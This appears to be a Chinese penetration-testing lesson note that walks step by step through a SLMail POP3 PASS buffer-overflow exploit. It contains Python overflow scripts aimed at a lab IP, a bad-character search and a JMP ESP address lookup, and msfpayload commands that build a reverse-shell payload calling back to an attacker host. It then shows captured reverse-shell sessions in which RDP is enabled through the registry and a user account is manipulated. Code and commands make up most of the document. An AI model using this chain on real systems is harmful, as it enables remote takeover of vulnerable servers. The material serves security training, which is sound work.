@@ -1,0 +1,288 @@
+课时41 FUZZING
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                             ┃
+┃思路：                                                                              ┃
+┃    将EIP修改为shellcode代码的内存地址，将Shellcode写入到地址空间，程序读取EIP寄存器┃
+┃    数值，将跳转到shellcode代码段并执行;                                            ┃
+┃寻找可存放shellcode的内存空间                                                       ┃
+┃06.py                                                                               ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╭────────────────────────────────────────────╮
+[06.py]
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+buffer = "A" * 2606+"B"*4+"C"*(3500-2606-4)
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    s.send('USER test'+'\r\n')
+    data = s.rec(1024)
+    s.send('PASS' + buffer 'test\r\n')
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./06.py
+
+Sending evil buffer
+
+
+Done!
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                 ┃
+┃不同类型的程序、协议、漏洞，会讲某些字符认为是坏字符，这些字符有固定用途┃
+┃    返回地址、Shellcode、buffer中都不能出现坏字符                       ┃
+┃    null byte (0x00)空字符，用于种植字符串的拷贝操作                    ┃
+┃    return (0x0D)回车操作，表示POP3 PASS命令输入完成                    ┃
+┃    思路：发送0x00-----0xff 256个字符，查找所有坏字符                   ┃
+┃    07.py                                                               ┃
+┃    0x0A                                                                ┃
+┃    OxOD                                                                ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╭────────────────────────────────────────────╮
+[07.py]
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+badchars = (
+    //（256个十六进制字符串，这里我就不写了！）
+)
+buffer = "A" * 2606+"B"*4 + badchars
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    s.send('USER test'+'\r\n')
+    data = s.rec(1024)
+    s.send('PASS' + buffer 'test\r\n')
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./07.py
+
+Sending evil buffer
+
+
+Done!
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                           ┃
+┃重定向数据流                                                                      ┃
+┃    用ESP的地址替换EIP的值                                                        ┃
+┃    但是ESP地址变化，硬编码不可行                                                 ┃
+┃    SLMali线程应用程序，操作系统为每个线程分配一段地址范围，每个线程地址范围不确定┃
+┃变通思路                                                                          ┃
+┃    在内存中寻找地址固定的系统模块                                                ┃
+┃    在模块中寻找JMP ESP指令的地址跳转，再由该指令间接跳转到ESP，从而执行shellcode ┃
+┃    mona.py脚本识别内存模块，搜索"return address"是JMP ESP指令的模块              ┃
+┃    寻找无DEP、ALSR保护的内存地址                                                 ┃
+┃    内存地址不包含坏字符                                                          ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@kali:~# cd /usr/share/metasploit-framework/tools/
+
+root@kali:/usr/share/metasploit-framework/tools# ./nasm_shell.rb    //汇编语言转换成二进制
+nasm > jmp esp
+00000000 FFE4               jmp esp
+nasm > exit
+
+╋━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                   ┃
+┃寻找不受保护的系统模块                    ┃
+┃    lmona modules                         ┃
+┃将汇编指令jmp esp转换成二进制             ┃
+┃    ./nasm shell                          ┃
+┃    FFE4                                  ┃
+┃在模块中搜索FFE4指令                      ┃
+┃    lmona find -s "\xff\xe4" -m slmfc.dll ┃
+┃    选择不包含坏字符的内存地址            ┃
+┃在该地址设置断点                          ┃
+┃重发buffer                                ┃
+┃    08.py(地址全翻转)                     ┃
+╋━━━━━━━━━━━━━━━━━━━━━╋
+
+╭────────────────────────────────────────────╮
+[08.py]
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "C" * 390
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    s.send('USER test'+'\r\n')
+    data = s.rec(1024)
+    s.send('PASS' + buffer 'test\r\n')
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# ./08.py
+
+Sending evil buffer
+
+
+Done!
+
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                   ┃
+┃生成shellcode                                                             ┃
+┃Scratch                                                                   ┃
+┃./msfpayload                                                              ┃
+┃./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 C                 ┃
+┃./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 R | ./msfencode -b┃
+┃"\x00\x0a\x0d"                                                            ┃
+┃nc -vlp 443                                                               ┃
+┃09.py                                                                     ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+
+root@kali:~# cd /usr/share/framework2/
+
+root@kali:/usr/share/framework2/# ls msfpayload -l
+
+root@kali:/usr/share/framework2/# ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 C
+
+root@kali:/usr/share/framework2/# ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 R | ./msfencode -b "\x00\x0a\x0d"
+
+root@kali:/usr/share/framework2/# ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 R | ./msfencode -b "\x00\x0a\x0d" | grep 00
+[*] Using Msf:Encoder:PexFnstenvMov with final size of 310 bytes
+
+root@kali:/usr/share/framework2/# ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 R | ./msfencode -b "\x00\x0a\x0d" | grep 0a
+[*] Using Msf:Encoder:PexFnstenvMov with final size of 310 bytes
+
+root@kali:/usr/share/framework2/# ./msfpayload win32_reverse LHOST=192.168.20.8 LPORT=443 R | ./msfencode -b "\x00\x0a\x0d" | grep 0b
+[*] Using Msf:Encoder:PexFnstenvMov with final size of 310 bytes
+
+╭────────────────────────────────────────────╮
+[09.py]
+#!/usr/bin/python
+import socket
+
+s = socket.socket(socket.AF_INEF.socket.SOCK_STREAM)
+
+shellcode = (
+    //（256个十六进制字符串，这里我就不写了！）
+)
+
+buffer = "A" * 2606 + "\xe3\x41\x4b\x5f" + "\x90" * 8 + shellcode
+try:
+    print "\nSending evil buffer..."
+    s.connect(('192.168.20.32',110))
+    data = s.recv(1024)
+    s.send('USER test'+'\r\n')
+    data = s.rec(1024)
+    s.send('PASS' + buffer 'test\r\n')
+    print "\nDone!"
+except:
+    print "Could not connect to POP3!"
+╰────────────────────────────────────────────╯
+
+root@kali:~# nc -vlp 444
+Listening on [any] 444 ...
+connect to [192.168.1.117] from localhost [192.168.1.119] 1053
+Microsoft Windows XP | ?? 5.1.2006]
+
+(C) ???? ???? 1985-2001 Microsoft Corp
+
+C:\Program Files\SLmail\System>cd\
+cd\
+
+C:\>dir
+dir
+????? C ??????
+?????? ??? 94CE=E07B
+
+C:\ ???
+
+
+
+root@kali:~# ./09.py
+
+Sending evil buffer
+
+
+Done!
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                           ┃
+┃Shellcode执行结束后以ExitProcess方式退出整个进程，将导致邮件服务奔溃；            ┃
+┃Slmail是一个基于线程应用，适用ExitThread方式可以避免整个服务崩溃，可实现重复溢出；┃
+┃./msfpadload win32_reverse LHOST=192.168.20.8 EXITFUNC=thread LPORT=443 R         ┃
+┃| ./msfencode -b "\x00\x0a\x0d"                                                   ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃FUZZING                                                                             ┃
+┃echo Windows Registrv Editor Version 5.00>3389.reg                                  ┃
+┃echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer]>>3389.reg ┃
+┃echo "fDenyTSConnections"=dword:00000000>>3389.reg                                  ┃
+┃echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer\Wds\rdpwd\ ┃
+┃Tds\tcp]>>3389.reg                                                                  ┃
+┃echo "PortNumber"=dword:00000d3d>>3389.reg                                          ┃
+┃echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer\WinStations┃
+┃\RDP-Tcp]>>3389.reg                                                                 ┃
+┃echo "PortNumber"=dword:00000d3d>>3389.reg                                          ┃
+┃regedit /s 3389.reg                                                                 ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋ 
+root@kali:~# nc -vlp 444
+Listening on [any] 444 ...
+connect to [192.168.1.117] from localhost [192.168.1.119] 1053
+Microsoft Windows XP | ?? 5.1.2006]
+
+(C) ???? ???? 1985-2001 Microsoft Corp
+
+C:\Program Files\SLmail\System>cd\
+cd\
+
+C:\>echo Windows Registrv Editor Version 5.00>3389.reg
+echo Windows Registrv Editor Version 5.00>3389.reg
+
+C:\>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer]>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer]>>3389.reg
+
+C:\>echo "fDenyTSConnections"=dword:00000000>>3389.reg
+echo "fDenyTSConnections"=dword:00000000>>3389.reg
+
+C:\>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer\Wds\rdpwd\Tds\tcp>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer\Wds\rdpwd\Tds\tcp>>3389.reg
+
+C:\>echo "PortNumber"=dword:00000d3d>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+
+C:\>echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer\WinStations\RDP-Tcp]>>3389.reg
+echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Contral\TerminalServer\WinStations\RDP-Tcp]>>3389.reg
+
+C:\>echo "PortNumber"=dword:00000d3d>>3389.reg
+echo "PortNumber"=dword:00000d3d>>3389.reg
+
+C:\>regedit /s 3389.reg
+regedit /s 3389.reg
+
+C:\>shutdown -r -t 0
+shutdown -r -t 0
+
+C:\>net user yuanhu *
+
+root@kali:~# apt-get install rdesktop      //linux下的远程桌面
+
+root@kali:~# rdesktop 192.168.1.119
+WARNING: Remote desktop does not support colour depth 24; falling back to 16
+
+regsnap
+RegSnap可以详细地向你报告注册表及其他与系统有关项目的修改变化情况。RegSnap 对系统的比较报告非常具体，对注册表可报告修改了哪些键，修改前、后的值各是多少；增加和删除了哪些键以及这些键的值。报告结果既可以以纯文本的方式，也可以 html 网页的方式显示，非常便于查看。除系统注册表以外，RegSnap 还可以报告系统的其他情况：Windows 的系统目录和系统的 system 子目录下文件的变化情况，包括删除、替换、增加了哪些文件；Windows 的系统配置文件win.ini 和 system.ini 的变化情况，包括删除、修改和增加了哪些内容；自动批处理文件 autoexec.bat 是否被修改过。该软件可以在需要的时候方便地恢复注册表，可以直接调用 regedit 程序查看或修改注册表，还可以查看当前机器的机器名和用户名。
